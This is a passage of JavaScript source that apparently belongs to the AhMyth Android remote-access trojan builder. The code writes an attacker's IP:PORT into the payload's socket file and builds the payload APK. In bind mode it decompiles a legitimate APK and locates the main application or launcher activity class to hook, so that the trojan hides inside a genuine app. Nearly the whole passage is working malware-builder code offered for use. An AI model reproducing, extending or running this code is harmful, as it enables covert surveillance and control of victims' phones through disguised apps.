                $appCtrl.Log(`[x] Wrong Java Version Installed, Detected Version "${javaVersion}"`, CONSTANTS.logStatus.FAIL);
                $appCtrl.Log('[¡] AhMyth Requires Java 11 to Decompile, Build and Sign Payloads.', CONSTANTS.logStatus.INFO);
                return;
            } else {
                if (!ip) {
                    $appCtrl.Log('[x] ' + 'IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
                    return;
                }
                if (!port) {
                    port = CONSTANTS.defaultPort;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'IP:PORT');
                            delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
                        var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali");
                        delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');

                        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'IP:PORT');
                                delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }
                            $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
                        });
                    });
                } else {
                    var filePath = $appCtrl.filePath;
                    if (!filePath) {
                        $appCtrl.Log('[x] ' + 'Browse for the Original APK you Want to Bind With', CONSTANTS.logStatus.FAIL);
                        return;
                    }
                    if (!filePath.includes(".apk")) {
                        $appCtrl.Log('[x] ' + 'Sorry! This is not an APK file', CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'IP:PORT');
                            delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
                        var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali");
                        delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');

                        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'IP:PORT');
                                delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // generate a solid ahmyth apk
                            var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                            delayedLog('[★] ' + 'Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");

                            var decompileApk = 'java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"';

                            exec(decompileApk, (error, stdout, stderr) => {
                                if (error !== null) {
                                    delayedLog('[x] Decompiling Failed!', CONSTANTS.logStatus.FAIL);
                                    writeErrorLog(error, 'Decompiling');
                                    delayedLog('[¡] Error Written to "Decompiling.log" on', CONSTANTS.logStatus.INFO);
                                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                    return;
                                }

                                if ($appCtrl.bindApk.method == 'BOOT')
                                    $appCtrl.bindOnBoot(apkFolder);

                                else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                    $appCtrl.bindOnActivity(apkFolder);

                            });
                        });
                    });
                }
            }
        });
    };
});

// Function to check if Java version 11 is installed
function checkJavaVersion(callback) {
    exec('java -version',
        (error, stdout, stderr) => {
            if (error) {
                callback(new Error('Java is not installed or not accessible.'));
            } else {
                const versionOutput = stderr || stdout;
                const versionMatch = versionOutput.match(/version "(\d+)\.(\d+)\.|version "(\d+)\-internal"/);
                if (versionMatch) {
                    const majorVersion = parseInt(versionMatch[1] || versionMatch[3], 10);
                    callback(null, majorVersion);
                } else {
                    callback(new Error('Java is not installed or not accessible.'));
                }
            }
        });
}

// function to delay logs by 0300
function delayedLog(msg, status) {
    let count = delayedLog.count = (delayedLog.count || 0) + 1;
    setTimeout(() => {
        $appCtrl.Log(msg, status);
    },
        count * 0o300);
};

function writeErrorLog(errorMessage, errorType) {
    // Check if the log directory exists, if not then create it
    if (!fs.existsSync(logPath)) {
        fs.mkdirSync(logPath);
    }

    // Write the error to the appropriate log file based on the error type
    switch (errorType) {
        case 'Parsing':
            fs.appendFileSync(dir.join(logPath, 'Parsing.log'), errorMessage + '\n');
            break;

        case 'Reading':
            fs.appendFileSync(dir.join(logPath, 'Reading.log'), errorMessage + '\n');
            break;

        case 'Writing':
            fs.appendFileSync(dir.join(logPath, 'Writing.log'), errorMessage + '\n');
            break;

        case 'Building':
            fs.appendFileSync(dir.join(logPath, 'Building.log'), errorMessage + '\n');
            break;

        case 'Signing':
            fs.appendFileSync(dir.join(logPath, 'Signing.log'), errorMessage + '\n');
            break;

        case 'Decompiling':
            fs.appendFileSync(dir.join(logPath, 'Decompiling.log'), errorMessage + '\n');
            break;

        case 'IP:PORT':
            fs.appendFileSync(dir.join(logPath, 'IP-PORT.log'), errorMessage + '\n');
            break;

        case 'Copying':
            fs.appendFileSync(dir.join(logPath, 'Copying.log'), errorMessage + '\n');
            break;

        default:
            // If the error type is not recognized, write it to a generic error log file
            fs.appendFileSync(dir.join(logPath, 'Error.log'), errorMessage + '\n');
            break;
    }
}

function getLauncherActivity(manifest) {

    delayedLog('[★] Searching for a Hookable Class Activity in the Modified Manifest Data...');

    const application = manifest['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
        mainApplicationClassName = mainApplicationClassName.split('.').pop();
        if (mainApplicationClassName.startsWith('.')) {
            mainApplicationClassName = mainApplicationClassName.slice(1);
        }
        delayedLog('[¡] Scoped the Main App Class for Hooking...', CONSTANTS.logStatus.INFO);
        return mainApplicationClassName + '.smali';
    }

    const activity = application && application['activity'] && application['activity'].find((activity) => {
        const intentFilter = activity['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activity) {
        let mainActivityClassName = activity['$'] && activity['$']['android:name'];
        if (!mainActivityClassName.startsWith('android.app')) {
            mainActivityClassName = mainActivityClassName.split('.').pop();
            if (mainActivityClassName.startsWith('.')) {
                mainActivityClassName = mainActivityClassName.slice(1);
            }
            delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
            return mainActivityClassName + '.smali';
        }
    }

    const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
        const intentFilter = activityAlias['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activityAlias) {
        let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
        targetActivityName = targetActivityName.split('.').pop();
        if (targetActivityName.startsWith('.')) {
            targetActivityName = targetActivityName.slice(1);
        }
        delayedLog('[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking...', CONSTANTS.logStatus.INFO);
        return targetActivityName + '.smali';
    }

    return -1;

}

function getLauncherPath(launcherActivity, apkFolder, callback) {
    let found = false;
    let launcherPath = null;
    readdirp(apkFolder, {
        fileFilter: launcherActivity, alwaysStat: true
    })
        .on('data', (entry) => {
            found = true;
            var {
                path, stats: { }
            } = entry;
            var output = `${JSON.stringify(path)}`;
            launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
        })
        .on('end',
            () => {
                if (!found) {
                    callback('[x] Unable to Locate the Hookable Main Class File!');
                    callback('[x] Please Use the "On Boot" Method!');
                } else {
                    callback(null, launcherPath);
                }
            })
        .on('error',
            (err) => {
                callback(err);
            });
}
